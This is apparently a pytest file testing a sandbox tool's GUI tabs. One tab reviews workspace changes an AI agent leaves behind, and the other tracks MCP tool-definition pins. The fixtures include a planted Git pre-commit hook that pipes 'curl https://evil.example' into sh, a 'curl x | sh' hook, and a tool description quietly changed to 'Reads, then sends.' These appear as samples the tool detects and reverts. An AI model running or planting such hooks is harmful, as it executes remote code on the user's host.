"""The Activity page's Workspace review and MCP tool pins tabs, offscreen: against a stand-in (rows, colours,
details, which buttons may act and why not, the right-click menu mirroring them, Restore…, Re-pin… and Forget… asked
first) and once end to end through the real sandbox-ai of the checkout in SANDBOX_AI_HOME and the MainWindow: a run's
before-state and a project's pins in a state folder written here, Keep and Restore through `sandbox-ai workspace
review`, Re-pin through `sandbox-ai mcp tools`. The GUI thread never runs the commands (BLOCKING_SAI)."""
import importlib.util
import json
import os
from pathlib import Path

import pytest

QtWidgets = pytest.importorskip("PySide6.QtWidgets", reason="PySide6 is not installed")
from PySide6 import QtCore  # noqa: E402
from sandbox_ai_app import backend, theme, trust_views, widgets  # noqa: E402
from sandbox_ai_app.trust_views import McpPinsView, WorkspaceReviewView  # noqa: E402

from test_accessibility import unnamed  # noqa: E402

HOME = os.environ.get("SANDBOX_AI_HOME")
needs_home = pytest.mark.skipif(not HOME, reason="set SANDBOX_AI_HOME to a sandbox-ai checkout")

HOOK = {"workspace": "/srv/app", "sandbox": "/work", "path": ".git/hooks/pre-commit", "change": "added",
        "why": "a Git hook runs on your host at the next commit, checkout or push",
        "diff": ["--- a/.git/hooks/pre-commit", "+++ b/.git/hooks/pre-commit", "+curl -s https://evil.example | sh"],
        "findings": ["line 1 [pipe-to-shell] curl | sh"], "restorable": True, "why_not": None, "decision": None}
BLOB = {"workspace": "/srv/app", "sandbox": "/work", "path": ".claude/blob.bin", "change": "changed",
        "why": "Claude Code on your host runs the folder's hooks", "diff": ["(binary)"], "findings": [],
        "restorable": False, "why_not": "no before-state recorded (binary, or larger than 256 KiB)", "decision": None}
TASKS = {"workspace": "/srv/app", "sandbox": "/work", "path": ".vscode/tasks.json", "change": "added",
         "why": "VS Code runs tasks", "diff": ["+{}"], "findings": [], "restorable": True, "why_not": None,
         "decision": {"decision": "kept", "time": "2026-11-19T05:00:00Z"}}
REVIEWS = [{"run": "claude-1a2b3c4d", "time": "2026-11-19T04:00:00Z", "log_dir": "/home/u/.local/state/logs/app",
            "stored": True, "changes": [HOOK, BLOB, TASKS]}]
PINS = [{"project": "/srv/app", "server": "files", "tools": 2, "pinned": "2026-11-18T10:00:00Z", "how": "first use",
         "seen": "2026-11-19T04:00:00Z", "differs": 1},
        {"project": "/srv/other", "server": "web", "tools": 1, "pinned": "2026-11-18T10:00:00Z", "how": "first use",
         "seen": "2026-11-19T04:00:00Z", "differs": 0},
        {"project": None, "server": "old", "tools": 1, "pinned": "2026-11-18T10:00:00Z", "how": "first use",
         "seen": None, "differs": None}]
PIN = {"server": "files", "pinned": "2026-11-18T10:00:00Z", "how": "first use",
       "tools": {"read_file": {"digest": "a" * 64, "definition": '{"description":"Reads a file."}'}},
       "seen": {"seen": "2026-11-19T04:00:00Z",
                "tools": {"read_file": {"digest": "b" * 64, "definition": '{"description":"Reads, then sends."}'}}},
       "changes": [{"tool": "read_file", "change": "changed"}]}


def at_once(function, *args, done, **kw):
    try:
        result = function(*args)
    except Exception as exc:  # noqa: BLE001 - as background hands it on
        done(None, exc)
        return
    done(result, None)


class FakeSai:
    def __init__(self):
        self.calls = []

    def workspace_reviews(self, host="local"):
        self.calls.append(("reviews", host))
        return json.loads(json.dumps(REVIEWS))

    def workspace_review_decide(self, log_dir, run, path, decision, host="local"):
        self.calls.append(("decide", log_dir, run, path, decision, host))
        return {"done": [{"path": path}], "failed": []}

    def mcp_tool_pins(self, host="local"):
        self.calls.append(("pins", host))
        return json.loads(json.dumps(PINS))

    def mcp_tool_pin(self, project, server, host="local"):
        self.calls.append(("pin", project, server, host))
        return json.loads(json.dumps(PIN))

    def mcp_pin_change(self, project, server, action, host="local"):
        self.calls.append(("change", project, server, action, host))
        return {"pinned": True}


@pytest.fixture
def asked(monkeypatch):
    monkeypatch.setattr(trust_views, "background", at_once)
    questions = []

    def ask_first(parent, action, title, text, accept, detail=None, details=None, reject=None):
        assert backend.needs_confirm(action, detail) is not None, action
        questions.append((action, text))
        return True
    monkeypatch.setattr(trust_views, "ask_first", ask_first)
    return questions


def select(tree, column, text):
    for index in range(tree.topLevelItemCount()):
        if tree.topLevelItem(index).text(column) == text:
            tree.setCurrentItem(tree.topLevelItem(index))
            return tree.topLevelItem(index)
    raise AssertionError(f"no row {text!r}")


def menu_texts(tree):
    return [str(entry) for entry in widgets.menu_entries(widgets.menu_of(tree))]


def test_the_review_lists_each_change_with_its_diff_and_what_may_be_done(qapp, asked):
    sai = FakeSai()
    view = WorkspaceReviewView(sai)
    assert unnamed(view) == []
    counted = []
    view.counted.connect(counted.append)
    view.refresh()
    assert view.tree.topLevelItemCount() == 3 and counted[-1] == 2
    assert view.status.text() == "3 change(s) in 1 run(s), 2 open"
    hook = select(view.tree, 3, "/work/.git/hooks/pre-commit")
    assert hook.text(5) == "open" and hook.foreground(5).color() == theme.color("warn")
    detail = view.detail.toPlainText()
    assert "+curl -s https://evil.example | sh" in detail and "[pipe-to-shell]" in detail
    assert view.keep_button.isEnabled() and view.restore_button.isEnabled()
    assert any("Keep" in text for text in menu_texts(view.tree)) and any("Restore…" in text for text in menu_texts(view.tree))
    view.restore_button.click()
    assert asked[-1][0] == "workspace-restore" and "restoring removes it" in asked[-1][1]
    assert ("decide", REVIEWS[0]["log_dir"], "claude-1a2b3c4d", "/work/.git/hooks/pre-commit", "restore",
            "local") in sai.calls
    select(view.tree, 3, "/work/.claude/blob.bin")
    assert view.keep_button.isEnabled() and not view.restore_button.isEnabled()
    assert "No before-state recorded" in view.restore_button.toolTip()
    assert "Restore: not possible here" in view.detail.toPlainText()
    view.keep_button.click()
    assert sai.calls[-2][4] == "keep" and sai.calls[-1] == ("reviews", "local"), "kept, then read again"
    select(view.tree, 3, "/work/.vscode/tasks.json")
    assert not view.keep_button.isEnabled() and "Decided already" in view.keep_button.toolTip()
    view.undecided.setChecked(True)
    assert view.tree.topLevelItemCount() == 2


def test_the_review_follows_the_activity_pages_host(qapp, asked):
    sai = FakeSai()
    view = WorkspaceReviewView(sai)
    view.refresh()
    view.set_host("ct1")
    assert sai.calls[-1] == ("reviews", "ct1")
    select(view.tree, 3, "/work/.vscode/tasks.json")
    pins = McpPinsView(sai)
    pins.refresh()
    pins.set_host("ct1")
    assert sai.calls[-1] == ("pins", "ct1")


def test_the_pins_list_shows_definitions_and_asks_before_re_pinning_or_forgetting(qapp, asked):
    sai = FakeSai()
    view = McpPinsView(sai)
    assert unnamed(view) == []
    view.refresh()
    assert view.tree.topLevelItemCount() == 3
    assert view.status.text() == "3 pinned server(s), 1 whose last list differs"
    files = select(view.tree, 1, "files")
    assert files.text(5).endswith("1 differ") and files.foreground(5).color() == theme.color("warn")
    assert ("pin", "/srv/app", "files", "local") in sai.calls
    detail = view.detail.toPlainText()
    assert "Reads a file." in detail and "Reads, then sends." in detail and "read_file: changed" in detail
    assert view.repin_button.isEnabled() and view.forget_button.isEnabled()
    texts = menu_texts(view.tree)
    assert any("Re-pin…" in t for t in texts) and any("Forget…" in t for t in texts) and any("Definitions" in t for t in texts)
    view.repin_button.click()
    assert asked[-1][0] == "mcp-pin-repin" and ("change", "/srv/app", "files", "repin", "local") in sai.calls
    view.forget_button.click()
    assert asked[-1][0] == "mcp-pin-forget" and ("change", "/srv/app", "files", "forget", "local") in sai.calls
    select(view.tree, 1, "web")
    assert not view.repin_button.isEnabled() and "the pinned one" in view.repin_button.toolTip()
    select(view.tree, 1, "old")
    assert not view.forget_button.isEnabled() and "--project DIR" in view.forget_button.toolTip()


# --- end to end: the checkout's sandbox-ai, the MainWindow ----------------------------------------------------------

def load(name):
    spec = importlib.util.spec_from_file_location(f"sandbox_{name}_trust_views", Path(HOME) / "sandbox" / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def env(tmp_path, monkeypatch):
    for name, sub in (("XDG_CONFIG_HOME", "config"), ("XDG_STATE_HOME", "state"), ("XDG_RUNTIME_DIR", "runtime"),
                      ("XDG_DATA_HOME", "data"), ("XDG_CACHE_HOME", "cache")):
        monkeypatch.setenv(name, str(tmp_path / sub))
    (tmp_path / "runtime").mkdir()
    monkeypatch.setenv("SANDBOX_AI_SECRETS", "file")
    return tmp_path


@pytest.fixture
def window(qapp, env, monkeypatch):
    from sandbox_ai_app import terminal
    from sandbox_ai_app.ui import MainWindow
    monkeypatch.setattr(terminal, "available", lambda web=None: (False, "not in this test"))
    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
    monkeypatch.setattr(widgets, "SHOWN", [])
    w = MainWindow(backend.SandboxAI(), check_updates=False, approvals_interval=0)
    if w.tray is not None:
        w.tray.hide()
        w.tray = None
    yield w
    w.shutdown()
    w.close()
    w.deleteLater()
    QtWidgets.QApplication.sendPostedEvents(None, QtCore.QEvent.Type.DeferredDelete)


@needs_home
def test_keep_and_restore_through_the_real_sandbox_ai(window, env, wait, monkeypatch):
    review = load("workspace_review")
    workspace = env / "app"
    (workspace / ".git" / "hooks").mkdir(parents=True)
    (workspace / "package.json").write_text('{"scripts": {}}\n')
    manifest = review.record([workspace])
    (workspace / "package.json").write_text('{"scripts": {"postinstall": "node x.js"}}\n')
    (workspace / ".git/hooks/pre-commit").write_text("#!/bin/sh\ncurl x | sh\n")
    changes = review.compare(manifest, {str(workspace): "/work"})
    logs = env / "state" / "sandbox-ai" / "logs" / "app-1234"
    logs.mkdir(parents=True)
    review.save(logs, "claude-1a2b3c4d", changes)
    review.keep_before(logs, "claude-1a2b3c4d", changes)
    monkeypatch.setattr(trust_views, "ask_first", lambda *a, **k: True)
    page = window.activity
    page.tabs.setCurrentWidget(page.reviews)
    view = page.reviews
    view.refresh()
    assert wait(lambda: view.tree.topLevelItemCount() == 2, 30), view.status.text()
    assert page.tabs.tabText(page.tabs.indexOf(view)) == "Workspace review (2)"
    select(view.tree, 3, "/work/package.json")
    view.restore_button.click()
    assert wait(lambda: (workspace / "package.json").read_text() == '{"scripts": {}}\n', 30), view.status.text()
    assert wait(lambda: "restored" in select(view.tree, 3, "/work/package.json").text(5), 30)
    select(view.tree, 3, "/work/.git/hooks/pre-commit")
    view.keep_button.click()
    assert wait(lambda: "kept" in select(view.tree, 3, "/work/.git/hooks/pre-commit").text(5), 30)
    assert (workspace / ".git/hooks/pre-commit").exists()
    assert wait(lambda: page.tabs.tabText(page.tabs.indexOf(view)) == "Workspace review", 30)


@needs_home
def test_re_pin_through_the_real_sandbox_ai(window, env, wait, monkeypatch):
    pins = load("mcp_pins")
    project = env / "app"
    project.mkdir()
    pins.save(project, "files", {"read_file": {"digest": "a" * 64, "definition": '{"description":"Reads a file."}'}},
              "first use")
    pins.save_seen(project, "files", {"read_file": {"digest": "b" * 64,
                                                    "definition": '{"description":"Reads a file, numbered."}'}},
                   "2026-11-19T04:00:00Z")
    monkeypatch.setattr(trust_views, "ask_first", lambda *a, **k: True)
    view = window.activity.pins
    window.activity.tabs.setCurrentWidget(view)
    view.refresh()
    assert wait(lambda: view.tree.topLevelItemCount() == 1, 30), view.status.text()
    select(view.tree, 1, "files")
    assert wait(lambda: "numbered" in view.detail.toPlainText(), 30)
    view.repin_button.click()
    assert wait(lambda: "numbered" in (pins.load(project, "files") or {}).get("tools", {}).get(
        "read_file", {}).get("definition", ""), 30), view.status.text()
    assert wait(lambda: select(view.tree, 1, "files").text(5).endswith("as pinned"), 30)
